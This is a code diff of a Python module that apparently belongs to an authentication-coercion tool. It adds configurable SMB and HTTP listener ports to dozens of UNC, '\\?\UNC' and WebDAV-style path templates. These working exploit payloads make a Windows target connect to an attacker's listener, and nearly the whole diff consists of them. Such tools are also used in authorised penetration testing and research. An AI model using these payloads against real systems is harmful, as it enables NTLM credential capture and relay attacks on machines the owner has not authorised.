@@ -4,6 +4,7 @@
 # Author             : Podalirius (@podalirius_)
 # Date created       : 15 Sep 2022
 
+
 import random
 import jinja2
 
@@ -23,56 +24,63 @@ def generate_exploit_templates(desired_auth_type=None):
         # Only ip
         ("smb", '{{listener}}\x00'),
         # SMB
-        ("smb", '\\\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\{{listener}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\{{listener}}\\{{rnd(8)}}\x00'),
-        ("smb", '\\\\{{listener}}\\\x00'),
-        ("smb", '\\\\{{listener}}\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\\\x00'),
+        ("smb", '\\\\{{listener}}{{smb_listen_port}}\x00'),
         # SMB path with ?
-        ("smb", '\\\\?\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\?\\{{listener}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\?\\{{listener}}\\{{rnd(8)}}\x00'),
-        ("smb", '\\\\?\\{{listener}}\\\x00'),
-        ("smb", '\\\\?\\{{listener}}\x00'),
-        #
-        ("smb", '\\\\.\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\.\\{{listener}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\.\\{{listener}}\\{{rnd(8)}}\x00'),
-        ("smb", '\\\\.\\{{listener}}\\\x00'),
-        ("smb", '\\\\.\\{{listener}}\x00'),
+        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
+        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
+        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\\\x00'),
+        ("smb", '\\\\?\\{{listener}}{{smb_listen_port}}\x00'),
+        # SMB path with .
+        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
+        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
+        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\\\x00'),
+        ("smb", '\\\\.\\{{listener}}{{smb_listen_port}}\x00'),
         # UNC path with ?
-        ("smb", '\\\\?\\UNC\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\?\\UNC\\{{listener}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\?\\UNC\\{{listener}}\\{{rnd(8)}}\x00'),
-        ("smb", '\\\\?\\UNC\\{{listener}}\\\x00'),
-        ("smb", '\\\\?\\UNC\\{{listener}}\x00'),
+        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
+        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
+        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
+        ("smb", '\\\\?\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
         # UNC path with .
-        ("smb", '\\\\.\\UNC\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
-        ("smb", '\\\\.\\UNC\\{{listener}}\\{{rnd(8)}}\\\x00'),
-        ("smb", '\\\\.\\UNC\\{{listener}}\\{{rnd(8)}}\x00'),
-        ("smb", '\\\\.\\UNC\\{{listener}}\\\x00'),
-        ("smb", '\\\\.\\UNC\\{{listener}}\x00'),
+        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00'),
+        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00'),
+        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00'),
+        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\\\x00'),
+        ("smb", '\\\\.\\UNC\\{{listener}}{{smb_listen_port}}\x00'),
+
+        # HTTP
+        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\File.txt\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}\\\x00'),
+        ("http", '\\\\{{listener}}{{http_listen_port}}\x00'),
     ]
 
     if add_uncommon_tests:
         templates += [
 
             # HTTP
-            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\\File.txt\x00'),
-            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\\\x00'),
-            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\x00'),
-            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\\\x00'),
-            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\{{rnd(8)}}\x00'),
-            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\\\x00'),
-            ("http", '\\\\{{listener}}@{{port}}\\{{rnd(3)}}\x00'),
+            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\\File.txt\x00'),
+            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\\\x00'),
+            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\\Path\x00'),
+            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\\\x00'),
+            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\{{rnd(8)}}\x00'),
+            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\\\x00'),
+            ("http", '\\\\{{listener}}{{http_listen_port}}\\{{rnd(3)}}\x00'),
 
-            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}/Path/File.txt\x00'),
-            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}/Path/\x00'),
-            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}/Path\x00'),
-            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}/\x00'),
-            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/{{rnd(8)}}\x00'),
-            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}/\x00'),
-            ("http", '//{{listener}}@{{port}}/{{rnd(3)}}\x00'),
+            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}/Path/File.txt\x00'),
+            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}/Path/\x00'),
+            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}/Path\x00'),
+            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}/\x00'),
+            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/{{rnd(8)}}\x00'),
+            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}/\x00'),
+            ("http", '//{{listener}}{{http_listen_port}}/{{rnd(3)}}\x00'),
 
             ("smb", '\\UNC\\{{listener}}\\{{rnd(8)}}\\file.txt\x00'),
             ("smb", '\\UNC\\{{listener}}\\{{rnd(8)}}\\\x00'),
@@ -106,8 +114,6 @@ def generate_exploit_templates(desired_auth_type=None):
             ("http", 'file://\\\\{{listener}}\\EndpointName\x00'),
         ]
 
-    # templates = [("smb", '\\\\{{listener}}\\{{rnd(8)}}\\file.txt\x00')]
-
     paths = []
     for auth_type, exploit_path in templates:
         if desired_auth_type is not None:
@@ -118,13 +124,25 @@ def generate_exploit_templates(desired_auth_type=None):
     return paths
 
 
-def generate_exploit_path_from_template(template, listener, port=80):
+def generate_exploit_path_from_template(template, listener, http_listen_port=80, smb_listen_port=445):
     # Declaring template functions
     rnd = gen_random_name
+
+    if smb_listen_port is not None and smb_listen_port != 445:
+        smb_listen_port = "@%d" % smb_listen_port
+    else:
+        smb_listen_port = ""
+
+    if http_listen_port is not None:
+        http_listen_port = "@%d" % http_listen_port
+    else:
+        http_listen_port = "@80"
+
     # Rendering template
     exploit_path = jinja2.Template(template).render(
         listener=listener,
         rnd=rnd,
-        port=port
+        http_listen_port=http_listen_port,
+        smb_listen_port=smb_listen_port
     )
     return exploit_path
